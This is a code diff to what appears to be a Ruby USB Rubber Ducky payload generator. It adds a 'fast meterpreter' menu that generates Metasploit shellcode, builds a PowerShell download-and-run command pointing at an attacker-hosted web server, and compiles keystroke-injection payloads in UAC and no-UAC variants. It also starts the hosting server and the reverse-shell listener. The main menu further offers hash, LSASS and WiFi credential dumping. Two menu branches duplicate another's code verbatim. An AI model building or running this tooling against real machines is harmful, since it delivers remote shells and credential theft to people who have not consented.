@@ -82,6 +82,22 @@ def meterpreter_setup
   powershell_command = powershell_reverse_meterpreter(shellcode)
   return powershell_command,host,port
 end
+def fast_meterpreter_setup
+  @server_setup = ServerSetUp.new
+  puts '*' * 30
+  puts 'Setting up the MSF server'
+  puts '*' * 30
+  msf_host = @server_setup.get_host
+  msf_port = @server_setup.get_port
+  puts '*' * 50
+  puts 'Setting up webserver to host the powershell script'
+  puts '*' * 50
+  web_host = @server_setup.get_host
+  web_port = @server_setup.get_port
+  shellcode = generate_shellcode(msf_host,msf_port)
+  @ssl ? powershell_command = powershell_fast_meterpreter("https://#{web_host}:#{web_port}") : powershell_command = powershell_fast_meterpreter("http://#{web_host}:#{web_port}")
+  return powershell_command,web_host,web_port,shellcode,msf_host,msf_port
+end
 def start_msf(host,port)
   msf = Readline.readline("#{get_input('Would you like to start the Metasploit Listener[yes/no]')} ", true)
   msf == 'yes' ? metasploit_setup(host,port) : print_info("Goody Bye!\n")
@@ -114,14 +130,16 @@ def case_main_menu
   answer = main_menu
   case answer
     when '1'
-      case_reverse_meterpreter_menu
+      case_fast_meterpreter_menu
     when '2'
-      case_dump_hashes_menu
+      case_reverse_meterpreter_menu
     when '3'
-      case_dump_lsass_menu
+      case_dump_hashes_menu
     when '4'
-      case_dump_wifi_menu
+      case_dump_lsass_menu
     when '5'
+      case_dump_wifi_menu
+    when '6'
       case_wget_menu
     #when '6'
     #  case_hex_to_bin_menu
@@ -131,6 +149,63 @@ def case_main_menu
       print_error('Bad Choice')
       sleep(1)
       case_main_menu
+  end
+end
+def case_fast_meterpreter_menu
+  fast_meterpreter_answer = fast_meterpreter_menu
+  case fast_meterpreter_answer
+    when '1'
+      @ssl = true
+      powershell_command,web_host,web_port,shellcode,msf_host,msf_port = fast_meterpreter_setup
+      print_info("Creating Text File!\n")
+      ducky_fast_meterpreter_uac(powershell_command)
+      compile_ducky(fast_meterpreter_file)
+      Thread.new { @server_setup.ruby_web_server(web_port,@ssl,web_host,shellcode) }
+      #ServerSetUp.new.ruby_web_server(web_port,@ssl,web_host,shellcode)
+      start_msf(msf_host,msf_port)
+    when '2'
+      @ssl = true
+      powershell_command,web_host,web_port,shellcode,msf_host,msf_port = fast_meterpreter_setup
+      print_info("Creating Text File!\n")
+      ducky_fast_meterpreter_no_uac(powershell_command)
+      compile_ducky(fast_meterpreter_file)
+      Thread.new { @server_setup.ruby_web_server(web_port,@ssl,web_host,shellcode) }
+      start_msf(msf_host,msf_port)
+    when '3'
+      @ssl = true
+      powershell_command,web_host,web_port,shellcode,msf_host,msf_port = fast_meterpreter_setup
+      print_info("Creating Text File!\n")
+      ducky_fast_meterpreter_low(powershell_command)
+      compile_ducky(fast_meterpreter_file)
+      Thread.new { @server_setup.ruby_web_server(web_port,@ssl,web_host,shellcode) }
+      start_msf(msf_host,msf_port)
+    when '4'
+      powershell_command,web_host,web_port,shellcode,msf_host,msf_port = fast_meterpreter_setup
+      print_info("Creating Text File!\n")
+      ducky_fast_meterpreter_uac(powershell_command)
+      compile_ducky(fast_meterpreter_file)
+      Thread.new { @server_setup.ruby_web_server(web_port,nil,web_host,shellcode) }
+      start_msf(msf_host,msf_port)
+    when '5'
+      powershell_command,web_host,web_port,shellcode,msf_host,msf_port = fast_meterpreter_setup
+      print_info("Creating Text File!\n")
+      ducky_fast_meterpreter_uac(powershell_command)
+      compile_ducky(fast_meterpreter_file)
+      Thread.new { @server_setup.ruby_web_server(web_port,nil,web_host,shellcode) }
+      start_msf(msf_host,msf_port)
+    when '6'
+      powershell_command,web_host,web_port,shellcode,msf_host,msf_port = fast_meterpreter_setup
+      print_info("Creating Text File!\n")
+      ducky_fast_meterpreter_uac(powershell_command)
+      compile_ducky(fast_meterpreter_file)
+      Thread.new { @server_setup.ruby_web_server(web_port,nil,web_host,shellcode) }
+      start_msf(msf_host,msf_port)
+    when '99'
+      case_main_menu
+    else
+      print_error('Bad Choice')
+      sleep(1)
+      case_fast_meterpreter_menu
   end
 end
 def case_reverse_meterpreter_menu
